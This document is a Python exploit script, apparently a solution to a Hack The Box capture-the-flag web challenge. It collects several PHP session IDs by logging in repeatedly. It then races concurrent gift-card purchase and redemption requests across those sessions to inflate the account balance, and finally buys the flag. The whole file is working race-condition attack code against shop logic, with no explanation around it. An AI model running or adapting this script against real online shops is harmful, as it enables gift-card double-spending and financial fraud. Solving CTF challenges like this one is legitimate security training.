import requests
import re
import argparse
import time
from concurrent.futures import ThreadPoolExecutor


# Target URL and headers
HEADERS_TEMPLATE = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}


def buy(sess_id, target):
    session = requests.Session()
    headers = HEADERS_TEMPLATE.copy()
    headers["Cookie"] = f"PHPSESSID={sess_id}"

    try:
        response = session.post(target + '/shop.php', headers=headers, data={"buy": 1}, timeout=5)
        print(f"[{sess_id}] Status: {response.status_code} Length: {len(response.content)}")

        if response.status_code == 200:
            gc_match = re.search(r'\b\d{16}\b', response.text)
            if gc_match:
                gift_card_code = gc_match.group(0)
                print(f"Gift Card Code: {gift_card_code}")
                return gift_card_code
            else:
                print("No 16-digit code found")

    except requests.RequestException as e:
        print(f"[{sess_id}] Error: {e}")

    return None


def login(username, password, target):
    session = requests.Session()
    try:
        response = session.post(target + '/login.php', data={'username': username, 'password': password}, timeout=5)
    except requests.RequestException as e:
        print(f"Login error: {e}")
        return None

    if response.status_code != 200:
        print(f"Login failed: {response.status_code}")
        return None

    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        print("PHPSESSID not found in cookies")
        return None

    return phpsessid


def mt_login(target, username, password):
    session = requests.Session()
    try:
        response = session.post(target + '/login.php', data={'username': username, 'password': password}, timeout=5)
        if response.status_code == 200:
            sid = session.cookies.get("PHPSESSID")
            if sid:
                print(f"[+] Got session: {sid}")
                return sid
    except requests.RequestException as e:
        print(f"[-] Login failed: {e}")
    return None

def collect_sessions(target, username, password, count=10):
    with ThreadPoolExecutor(max_workers=count) as executor:
        results = list(executor.map(lambda _: mt_login(target, username, password), range(count)))
    return [sid for sid in results if sid]


def redeem(sess_id, gift_card_code, target):

    session = requests.Session()
    headers = HEADERS_TEMPLATE.copy()
    headers["Cookie"] = f"PHPSESSID={sess_id}"
    proxy = {"http": "http://127.0.0.1:8080"}

    try:
        response = session.post(target + '/shop.php', headers=headers, data={"redeem": f"{gift_card_code}"})
        print(f"[{sess_id}] Status: {response.status_code} Length: {len(response.content)}")
    except requests.RequestException as e:
        print(f"Redeem error: {e}")
    
    return None

def get_balance(sess_id, target):
    session = requests.Session()
    headers = HEADERS_TEMPLATE.copy()
    headers["Cookie"] = f"PHPSESSID={sess_id}"
    
    try:
        response = session.get(target + '/shop.php', headers=headers, timeout=5)
        match = re.search(r'<b>Balance:</b>\s*(\d+)\$', response.text)
        if match:
            balance = int(match.group(1))
            print(f"[{sess_id}] Balance: {balance}$")
            return balance
        else:
            print(f"[{sess_id}] Balance not found.")
    except requests.RequestException as e:
        print(f"[{sess_id}] Error checking balance: {e}")
    
    return 0

def buy_flag(sess_id, target):
    session = requests.Session()
    headers = HEADERS_TEMPLATE.copy()
    headers["Cookie"] = f"PHPSESSID={sess_id}"

    try:
        response = session.post(target + '/shop.php', headers=headers, data={"buy": 2}, timeout=5)
        match = re.search(r'HTB\{[A-Za-z0-9]+\}', response.text)
        if match:
            print(f"FLAG: {match.group(0)}")
            return match.group(0)
        else:
            print("Flag purchase request sent, but no flag found.")
    except requests.RequestException as e:
        print(f"Error buying flag: {e}")

    return None


def collect_sessions_slow(target, username, password, count=10, delay=0.5):
    session_ids = []
    for i in range(count):
        sid = login(username, password, target)
        if sid:
            session_ids.append(sid)
        time.sleep(delay)  # delay in seconds between logins
    return session_ids


def parse_args():
    parser = argparse.ArgumentParser(description="Description of your script.")
    
    parser.add_argument("-t", "--target", type=str, required=True, help="Target")
    parser.add_argument("--username", type=str, required=True, help="Username for login")
    parser.add_argument("--password", type=str, required=True, help="Password for login")
    parser.add_argument("--num-logins", type=int, help="Number of logins to get many phpsession ids")
    
    return parser.parse_args()

def main():
    args = parse_args()

    # Step 1: Collect reusable sessions
    SESSION_IDS = collect_sessions_slow(args.target, args.username, args.password, args.num_logins, delay=0.5)
    if not SESSION_IDS:
        print("No session IDs collected. Exiting.")
        return

    print(f"[+] Collected {len(SESSION_IDS)} session IDs.")

    sess_to_use = SESSION_IDS[0]
    balance = get_balance(sess_to_use, args.target)

    while balance < 100:
        print(f"[!] Current balance: {balance}$. Racing on gift card buy...")

        # Race all sessions to try to buy a gift card at the same time
        with ThreadPoolExecutor(max_workers=len(SESSION_IDS)) as executor:
            results = list(executor.map(
                lambda pair: buy(*pair),
                zip(SESSION_IDS, [args.target] * len(SESSION_IDS))
            ))

        # Optional: Print gift cards seen in the race
        gift_card_codes = [code for code in results if code is not None]
        print(f"[+] Race resulted in {len(gift_card_codes)} gift card(s):")
        for code in gift_card_codes:
            print(f"    - {code}")

        # Try redeeming any that were collected
        for gc_code in gift_card_codes:
            with ThreadPoolExecutor(max_workers=len(SESSION_IDS)) as executor:
                list(executor.map(
                    lambda pair: redeem(*pair),
                    zip(SESSION_IDS, [gc_code] * len(SESSION_IDS), [args.target] * len(SESSION_IDS))
                ))

        # Re-check balance
        balance = get_balance(sess_to_use, args.target)

    # Step 4: Buy the flag
    print(f"[+] Final balance: {balance}$. Attempting to purchase the flag...")
    flag = buy_flag(sess_to_use, args.target)
    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] Flag purchase failed.")

if __name__ == "__main__":
    main()